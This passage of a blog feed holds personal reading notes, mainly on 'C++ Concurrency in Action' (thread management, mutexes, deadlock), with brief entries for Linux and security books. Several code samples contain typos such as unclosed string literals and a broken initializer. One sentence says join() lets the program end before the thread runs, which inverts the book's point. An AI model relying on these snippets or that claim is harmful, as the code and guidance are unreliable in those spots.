First Script"></a>Chapter 24 - Writing Your First Script</h1><h1 id="Chapter-25-Starting-a-Project"><a href="#Chapter-25-Starting-a-Project" class="headerlink" title="Chapter 25 - Starting a Project"></a>Chapter 25 - Starting a Project</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="Command Line" scheme="http://example.com/tags/Command-Line/"/>
    
    <category term="Linux Command" scheme="http://example.com/tags/Linux-Command/"/>
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Designing Anonymous Communication Chains for Offensive and Defensive Cybersecurity</title>
    <link href="http://example.com/2026/01/14/2016-1-14-BookDesigningAnonymousCommChains/"/>
    <id>http://example.com/2026/01/14/2016-1-14-BookDesigningAnonymousCommChains/</id>
    <published>2026-01-13T16:55:10.000Z</published>
    <updated>2026-01-23T03:07:28.133Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/DesigningAnonymousChains/libro.png'><img src="/images/books/DesigningAnonymousChains/libro.png" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e</title>
    <link href="http://example.com/2026/01/09/2026-1-9-BookLinuxFirewall/"/>
    <id>http://example.com/2026/01/09/2026-1-9-BookLinuxFirewall/</id>
    <published>2026-01-08T16:56:53.000Z</published>
    <updated>2026-01-09T12:42:30.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-Libro"><a href="#El-Libro" class="headerlink" title="El Libro"></a>El Libro</h1><p align="center" class='item-img' data-src='/images/books/LinuxFirewall/libro.png'><img src="/images/books/LinuxFirewall/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e”.<br>The content will be continuously updated as I read through the book.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-Libro&quot;&gt;&lt;a href=&quot;#El-Libro&quot; class=&quot;headerlink&quot; title=&quot;El Libro&quot;&gt;&lt;/a&gt;El Libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] C++ Concurrency In Action (Second Edition)</title>
    <link href="http://example.com/2026/01/08/2026-1-8-BookCppConcurrencyInAction2ed/"/>
    <id>http://example.com/2026/01/08/2026-1-8-BookCppConcurrencyInAction2ed/</id>
    <published>2026-01-08T11:14:40.000Z</published>
    <updated>2026-01-27T07:34:31.337Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-Libro"><a href="#El-Libro" class="headerlink" title="El Libro"></a>El Libro</h1><p align="center" class='item-img' data-src='/images/books/CppConcurrency/libro.png'><img src="/images/books/CppConcurrency/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “C++ Concurrency In Action (Second Edition)”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Hello-world-of-concurrency"><a href="#Chapter-1-Hello-world-of-concurrency" class="headerlink" title="Chapter.1 - Hello, world of concurrency"></a>Chapter.1 - Hello, world of concurrency</h1><h2 id="1-1-What-is-concurrency"><a href="#1-1-What-is-concurrency" class="headerlink" title="1.1 - What is concurrency"></a>1.1 - What is concurrency</h2><p>At the simplest and most basic level, <strong>concurrency</strong> is about two or more separate activities happening at the same time. You can watch football while I go swimming, and so on.</p><p>When we talk about concurrency in terms of computers, we mean a single system performing multiple independent activities in parallel, rather than sequentially, or one after the other.</p><h3 id="Concurrency-vs-Parallelism"><a href="#Concurrency-vs-Parallelism" class="headerlink" title="Concurrency vs. Parallelism"></a>Concurrency vs. Parallelism</h3><p>Concurrency and parallelism have largely overlapping meanings with respect to multithreaded code. Indeed, to many they mean the same thing.</p><p>The difference is primarily a matter of nuance, focus, and intent. Both terms are about running multiple tasks simultaneously, using the available hardware, but parallelism is much more performance-oriented.  </p><p>People talk about <strong>parallelism</strong> when their primary concern is talking advantage of the avaiable hardware to increase the performance of bulk data processing.</p><p>People talk about <strong>concurrency</strong> when their primary concern is separation of concerns, or responsiveness.</p><h2 id="1-4-Getting-Started"><a href="#1-4-Getting-Started" class="headerlink" title="1.4 - Getting Started"></a>1.4 - Getting Started</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;iostream&gt;<br>#include &lt;thread&gt;<br><br>void hello()<br>&#123;<br>    std::cout &lt;&lt; &quot;Hello concurrent world.\n;<br>&#125;<br><br>int main()<br>&#123;<br>    std::thread t(hello);<br>    t.join();<br>&#125;<br></code></pre></td></tr></table></figure><p>Every thread has to have an <strong>initial function</strong>, where the new thread of execution begins. For the initial thread in an application, this is <strong>main()</strong>, but for every other thread it’s specified in the constructor of a <strong>std::thread</strong> object——in this case, the <strong>std::thread</strong> objecct named <strong>t</strong> has the new <strong>hellow()</strong> function as its initial function.</p><p>With <strong>join()</strong>, the program possibily ends before the new thread had a chance to run.</p><h1 id="Chapter-2-Managing-threads"><a href="#Chapter-2-Managing-threads" class="headerlink" title="Chapter.2 - Managing threads"></a>Chapter.2 - Managing threads</h1><h2 id="2-1-Basic-thread-management"><a href="#2-1-Basic-thread-management" class="headerlink" title="2.1 - Basic thread management"></a>2.1 - Basic thread management</h2><p>Every C++ program has at least one thread, which is started by the C++ runtime: the thread running main().</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class background_task<br>&#123;<br>public:<br>    void operator()() const<br>    &#123;<br>        do_something();<br>        do_something_else();<br>    &#125;<br>&#125;;<br>background_task f;<br>std::thread my_thread(f);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread my_thread(background_task());<br></code></pre></td></tr></table></figure><p>One type of callable object that avoids this problem is a <strong>lambda expression</strong>. This is a new feature from C++11:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread my_thread([] &#123;<br>    do_something();<br>    do_something_else();<br>&#125;)<br></code></pre></td></tr></table></figure></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct func<br>&#123;<br>    int&amp; i;<br>    func(int&amp; i_): i(_)&#123;&#125;<br>    void operator()()<br>    &#123;<br>        for (unsigned j = 0; j &lt; 10000000; ++j)<br>        &#123;<br>            do_something(i);<br>        &#125;<br>    &#125;<br>&#125;;<br><br>void oops()<br>&#123;<br>    int some_local_state=0;<br>    func my_func(some_local_state);<br>    std::thread my_thread(my_func);<br>    my_thread.detach();<br>&#125;<br></code></pre></td></tr></table></figure><p>In this case, the new thread associated with <code>my_thread</code> will probably still be running when <code>oops</code> exists, because you’ve explicitly decided not to wait for it by calling <code>detach()</code>. The program will be terminated if <code>detach()</code> isn’t called.</p><p>If the thread is still running, you have this scenario: the nexst call to <code>do_something(i)</code> will access an already destroyed variable. This is like normal single-threaded code——allowing a pointer or reference to a local variable to persist beyond the function exit is never a good idea——but it’s earier to make the mistake with multithreaded code, because it isn’t necessarily immediately apparent that this has happened.</p><p>In particular, it’s a bad idea to create a thread within a function that has access to the local variables in that function, unless the thread is guarateed to finish before the function exits.</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct func;<br>void f()<br>&#123;<br>    int some_local_state = 0;<br>    func my_func(some_local_state);<br>    std::thread t(my_func);<br><br>    try<br>    &#123;<br>        do_something_in_current_thread();<br>    &#125;<br>    catch (...)<br>    &#123;<br>        t.join();<br>        throw;<br>    &#125;<br><br>    t.join();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-Passing-arguments-to-a-thread-function"><a href="#2-2-Passing-arguments-to-a-thread-function" class="headerlink" title="2.2 - Passing arguments to a thread function"></a>2.2 - Passing arguments to a thread function</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(int i, std::string const&amp; s);<br><br>std::thread t(f, 3, &quot;hello&quot;);<br></code></pre></td></tr></table></figure><p>Note that even though f takes a <code>std::string</code> as the second parameter, the string literal is passwd as a char const* and converted to a std::string only in the context of the new thread. This is particularly important when the argument supplied is a pointer to an automatic variable, as follows:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(int i, std::string const&amp; s);<br>void oops(int some_param)<br>&#123;<br>    char buffer[1024];<br>    sprintf(buffer, &quot;%i%, some_param);<br>    std::thread t(f, 3, buffer);<br>    t.detach();<br>&#125;<br></code></pre></td></tr></table></figure><br>In this case, it’s the pointer to the local variable <code>buffer</code> that’s passed through to the new thread and there’s a significant chance that the <code>oops</code> function will exit before the buffer has been converted to a <code>std::string</code> on the new thread, thus leading to undefined behavior. This solution is to cast to std::string before passing the buffer to the <code>std::thread</code> constructor:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(int i, std::string const&amp; s);<br>void oops(int some_param)<br>&#123;<br>    char buffer[1024];<br>    sprintf(buffer, &quot;%i%, some_param);<br>    std::thread t(f, 3, std::string(buffer));<br>    t.detach();<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-3-Transferring-ownership-of-a-thread"><a href="#2-3-Transferring-ownership-of-a-thread" class="headerlink" title="2.3 - Transferring ownership of a thread"></a>2.3 - Transferring ownership of a thread</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void some_function();<br>void some_other_function();<br>std::thread t1(some_function);<br>std::thread t2 = std::move(t1);<br>t1 = std::thread(some_other_function);<br>std::thread t3;<br>t3 = std::move(t2);<br>t1 = std::move(t3); //This assignment will terminate the program!<br></code></pre></td></tr></table></figure><p>First, a new thread is started and associated with <code>t1</code>. Ownership is then transferred over to <code>t2</code> when <code>t2</code> is constructed, by invoking <code>std::move()</code> to explicitly move ownership. At this point, <code>t1</code> no longer has an associated thread of execution; the thread running <code>some_function</code> is now associated with <code>t2</code>.</p><p>The final move tansfers ownership of the thread running <code>some_function</code> back to <code>t1</code> where it started. But in this case <code>t1</code> already had an associated thread (which was running some_other_function), so <code>std::terminate()</code> is called to terminated the program.</p><p>You cannot just drop a thread by assigning a new value to the <code>std::thread</code> object that manages it.</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread f()<br>&#123;<br>    void some_function();<br>    return std::thread(some_function);<br>&#125;<br>std::thread g()<br>&#123;<br>    void some_other_function(int);<br>    std::thread t(some_other_function, 42);<br><br>    return t;<br>&#125;<br></code></pre></td></tr></table></figure><p>Likewise, if ownership should be transferred into a function, it can accept an instance of <code>std::thread</code> by value as one of the parameters, as shown here:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void f(std::thread t);<br>void g()<br>&#123;<br>    void some_function();<br>    f(std::thread(some_function));<br>    std::thread t(some_function);<br><br>    f(std::move(t));<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id=""><a href="#" class="headerlink" title=""></a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class scoped_thread<br>&#123;<br>    std::thread t;<br>public:<br>    explicit scoped_thread(std::thread t_): t(std::move(t_))<br>    &#123;<br>        if (!t.joinable())<br>            throw std::logic_error(&quot;No thread&quot;);<br>    &#125;<br><br>    ~scoped_thread()<br>    &#123;<br>        t.join();<br>    &#125;<br><br>    scoped_thread(scoped_thread const&amp;) = delete;<br>    scoped_thread&amp; operator=(scoped_thread const&amp;)=delete;<br>&#125;;<br><br>struct func;<br>void f()<br>&#123;<br>    int some_local_state;<br>    scoped_thread t&#123;std::thread(func(some_local_state))&#125;;<br>    do_something_in_current_thread();<br>&#125;<br></code></pre></td></tr></table></figure></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void do_work(unsigned id);<br>void f()<br>&#123;<br>    std::vector&lt;std::thread&gt; threads;<br>    for (unsigned i = 0; i &lt; 20; ++i)<br>    &#123;<br>        threads.emplace_back(do_work, i);<br>    &#125;<br><br>    for (auto&amp; entry: threads)<br>        entry.join();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-Identifying-threads"><a href="#2-5-Identifying-threads" class="headerlink" title="2.5 - Identifying threads"></a>2.5 - Identifying threads</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread::id master_thread;<br>void some_core_part_of_algorithm()<br>&#123;<br>    if (std::this_thread::get_id() == master_thread)<br>    &#123;<br>        do_master_thread_work();<br>    &#125;<br><br>    do_common_work();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Chapter-3-Sharing-data-between-threads"><a href="#Chapter-3-Sharing-data-between-threads" class="headerlink" title="Chapter.3 - Sharing data between threads"></a>Chapter.3 - Sharing data between threads</h1><p>If you’re sharing data between threads, you need to have rules for which thread can access which bit of data when, and how any updates are communicated to the other threads that care about the data.</p><p>Incorrect use of shared data is one of the biggest causes of concurrency-related bugs, and the consequence can be serious.</p><h2 id="3-1-Problems-with-sharing-data-between-threads"><a href="#3-1-Problems-with-sharing-data-between-threads" class="headerlink" title="3.1 - Problems with sharing data between threads"></a>3.1 - Problems with sharing data between threads</h2><p>The probles with sharing data between threads are all due to the consequences of modifying data. <strong>If all shared data is read-only, there’s no problem, because the data read by on thread is unaffected by whether or not another thread is reading the same data</strong>.</p><p>Once concept that’s widely used to help programmers reason about their code is <strong>invariants</strong>——statements that are always true about a particular data struct, such as “this variable contains” the number of items in the list.” This invariants are often broken during an update, especially if the data structure is of any complexity or the update requires modification of more than one value.</p><h3 id="Race-conditions"><a href="#Race-conditions" class="headerlink" title="Race conditions"></a>Race conditions</h3><p>In concurrency, a race condition is anything where the outcome depends on the relative ordering of execution of operations on two or more threads; the threads race to perform their respective operations. This term is usually used to mean a <strong>problematic</strong> race condition.</p><p>The C++ standard also defines the term <strong>data race</strong> to mean the specific type of race condition; data races cause the dreaded <strong>undefined behavior</strong>.</p><h3 id="Avoiding-problematic-race-conditions"><a href="#Avoiding-problematic-race-conditions" class="headerlink" title="Avoiding problematic race conditions"></a>Avoiding problematic race conditions</h3><p>The simplest option is to wrap your data structure with a protection mechanism to ensure that only the thread performing a modification can see the intermediate states <strong>where the invariants are broken</strong>.</p><p>We can use <strong>memory model</strong>, <strong>lock-free</strong> to solve this problem.</p><h2 id="3-2-Protecting-shared-data-with-mutexes"><a href="#3-2-Protecting-shared-data-with-mutexes" class="headerlink" title="3.2 - Protecting shared data with mutexes"></a>3.2 - Protecting shared data with mutexes</h2><p><strong>Mutex</strong> stands for <strong>Mutual Exclusion</strong>.</p><p>Before accessing a shared data structure, you <strong>lock</strong> the mutex associated with that data, and when you’ve finished accessing the data structure, you <strong>unlock</strong> the mutex.</p><p>Mutexes are the most general of the data-rpotection mechanisms available in C++, but they’re not a silver bullet; it’s important to structure your code to protect in right data and avoid race conditions inherent in your interfaces.</p><p>Mutexes also come with their own problems in the form of a <strong>deadlock</strong> and protecting either too much or too little data.</p><h3 id="Using-mutexes-in-C"><a href="#Using-mutexes-in-C" class="headerlink" title="Using mutexes in C++"></a>Using mutexes in C++</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;mutex&gt;<br>#include &lt;algorithm&gt;<br><br>std::list&lt;int&gt; some_list;<br>std::mutex some_mutex;<br><br>void add_to_list(int new_value)<br>&#123;<br>    std::lock_guard&lt;std::mutex&gt; guard(some_mutex);<br>    some_list.push_back(new_value);<br>&#125;<br><br>bool list_contains(int value_to_find)<br>&#123;<br>    std::lock_guard&lt;std::mutex&gt; guard(some_mutex);<br>    return std::find(some_list.begin(),some_list.end(),value_to_find)<br>    != some_list.end();<br>&#125;<br></code></pre></td></tr></table></figure><p>If one of he member functions returns a pointer or reference to the protected data, then it doesn’t matter that the member functions all lock the mutex in a nice, orderly fashion, because you’ve blown a big hole in the protection. **Any code that has access to that pointer or reference can now access (and potentially modify) the protected data without locking the mutex.</p><p>Protecting data with mutex therefore requires careful interface design to ensure that the mutex is locked befored there’s any access to the protected data and that there are no backdoor.</p><h3 id="Structuring-code-for-protecting-shared-data"><a href="#Structuring-code-for-protecting-shared-data" class="headerlink" title="Structuring code for protecting shared data"></a>Structuring code for protecting shared data</h3><p>Protecting data with mutex is not quite as easy as slapping an <code>std::guard</code> object in every member function; one stray pointer or reference, and all that protection is for nothing.</p><p>As well as checking that the member functions don’t pass out pointers or references to their callers, it’s also important to check that they don’t pass there pointers or references <strong>IN</strong> to functions they call that arent’s under you control, this is dangerous.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class some_data<br>&#123;<br>    int a;<br>    std::string b;<br>public:<br>    void do_something();<br>&#125;;<br>class data_wrapper<br>&#123;<br>private:<br>    some_data data;<br>    std::mutex m;<br>public:<br>    template&lt;typename Function&gt;<br>    void process_data(Function func)<br>    &#123;<br>        std::lock_guard&lt;std::mutex&gt; l(m);<br>        func(data);<br>    &#125;<br>&#125;;<br><br>some_data* unprotected;<br>void malicious_function(some_data&amp; protected_data)<br>&#123;<br>    unprotected=&amp;protected_data;<br>&#125;<br><br>data_wrapper x;<br>void foo()<br>&#123;<br>    x.process_data(malicious_function);<br>    upprotected-&gt;do_something();<br>&#125;<br></code></pre></td></tr></table></figure><br>In this example, the code in <code>process_data</code> looks harmless enough, nicely protected with <code>std::lock_guard</code>, but the call to the user-supplied <code>func</code> function means that <code>foo</code> can pass in <code>malicious_function</code> to <strong>bypass the protection</strong> and then call <code>do_something()</code> without the mutex being locked.</p><blockquote><p>Guidline: Don’t pass pointers and references to protected data outside the scope of the lock, whether by returning them from a function, storing them in externally visible memory, or passing them as arguments to user-supplied functions.</p></blockquote><p>Just because you’re using a mutex or other mechanism to protect shared data, it doesn’t mean you’re protected from race conditions; you still have to ensure that the appropriate data is protected.</p><p>Consider the doubly linked list example. If you protected access to the pointers of each node individually, you’d be no better off than with code that used no mutexes, because the race condition could still happen——it’s not the individual nodes that need protecting for the individual steps but the whole data structure, for the whole delete operation. The easiest solution in this case is to have a single mutex that protects the entire list.</p><h3 id="Deadlock-the-problem-and-a-solution"><a href="#Deadlock-the-problem-and-a-solution" class="headerlink" title="Deadlock: the problem and a solution"></a>Deadlock: the problem and a solution</h3><p>Imagine a pair of threads arguing over locks on mutexes: each of a pair of threads needs to lock both of a pair of mutexes to perform some operation, and each thread has one mutex and is waiting for the other. Neither thread can proceed, because each is waiting for the other to release its mutex. This scenario is called <strong>deadlock</strong>, and it’s the biggest problem with having to lock two or more mutexes in order to perform an operation.</p><p>The common advice for avoiding deadlock is to always lock the two mutexes in the same order.</p><p>The C++ Standard Library has a cure for this in the form of <code>std::lock</code>——a function that can lock two or more mutexes at once without risk of deadlock.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class some_big_object;<br>void swap(some_big_object&amp; lhs, some_big_object&amp; rhs);<br>class X<br>&#123;<br>private:<br>    some_big_object some_detail;<br>    std::mutex m;<br>public:<br>    X(some_big_object const&amp; sd): some_detail(sd) &#123;&#125;<br><br>    friend void swap(X&amp; lhs, X&amp; rhs)<br>    &#123;<br>        if (&amp;lhs==&amp;rhs)<br>            return;<br><br>        std::lock(lhs.m, rhs.m);<br>        std::lock_guard&lt;std::mutex&gt; lock_a(lhs.m, std::adopt_lock);<br>        std::lock_guard&lt;std::mutex&gt; lock_b(rhs.m, std::adopt_lock);<br>        swap(lhs.some_detail, rhs.some_detail);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>First, the arguments are checked to ensure they are different instances, because attempting to acquire a lock on <code>std::mutex</code> when you already hold it is undefined behavior (A mutex that does permit multiple locks by the same thread is provided in the form of <code>std::recursive_mutex</code>.).<br>Then, the call to <code>std::lock()</code> locks the two mutexes, and two <code>std::lock_guard</code> instances are constructed and, one for each mutex.<br>The <code>std::adopt_lock</code> parameter is supplied in addition to the mutex to indicate to the <code>std::lock_guard</code> objects that the mutexes are already locked, and they should adopt the ownership of the existing lock on the mutex rather than attempt to lock the mutex in the constructor.</p><p>C++17 provides additional support for this scenario, in the form of a new RAII termplate, <code>std::scoped_lock&lt;&gt;</code>. This is exactly equivalent to <code>std::lock_guard&lt;&gt;</code>, except that it is a <strong>variadic template</strong>, accepting a <strong>list</strong> of mutex types as template parameters, and a <strong>list</strong> of mutexes as constructor arguments. The mutexes supplied to the constructor are locked using the same algorithm as <code>std::lock</code>, so that when the constructor completes they are all locked, and they are then all unlocked in the destructor.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void swap(X&amp; lhs, X&amp; rhs)<br>&#123;<br>    if(&amp;lhs==&amp;rhs)<br>        return;<br>    std::scoped_lock guard(lhs.m,rhs.m);<br>    swap(lhs.some_detail,rhs.some_detail);<br>&#125;<br></code></pre></td></tr></table></figure><br>This example uses another feature added with C++17: automatic deduction of class template parameters.<br>This line is equivalent to the equivalent to the fully specified version:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::scoped_lock&lt;std::mutex, std::mutex&gt; guard(lhs.m, rhs.m);<br></code></pre></td></tr></table></figure></p><p>The existence of <code>std::scoped_lock</code> means that most of the cases where you would have used <code>std::lock</code> prior to C++17 can now be written using <code>std::scoped_lock</code>, with less potential for mistakes.</p><p>You have to rely on your discipline as developers to ensure you don’t get get deadlock. This isn’t easy: deadlocks are one of the nastiest problems to encounter in multithreaded code and are often unpredictable, with everything working fine the majority of the time.</p><h3 id="Futher-guidlines-for-avoiding-deadlock"><a href="#Futher-guidlines-for-avoiding-deadlock" class="headerlink" title="Futher guidlines for avoiding deadlock"></a>Futher guidlines for avoiding deadlock</h3><p>Deadlock doesn’t only occur with locks. You can create deadlock with two threads and no locks by having each thread call <code>join()</code> on the <code>std::thread</code> object for the other. In this case, neither thread can make progress because it’s waiting for the other to finish.</p><p>The guidlines for avoiding deadlock all boil down to one idea: don’t wait for another thread if there’s a chance it’s waiting for you.</p><ul><li><strong>Avoid nested locks</strong>:<br>Don’t acquire a lock if you already hold one. If you stick to this guidline, it’s impossible to get a deadlock from the lock usage alone because each thread only ever holds a single lock. You should still get deadlock from other things (like the threads waiting for each other), but mutex locks are probably the most common cause of deadlock.</li><li><strong>Avoid calling user-suplied code while holding a lock</strong>:<br>This is a simple follow-on from the previous guidline. Because the code is user-supplied, you have no idea what it could do; it could do anything, including acquiring a lock.</li><li><strong>Acquire locks in a fixed 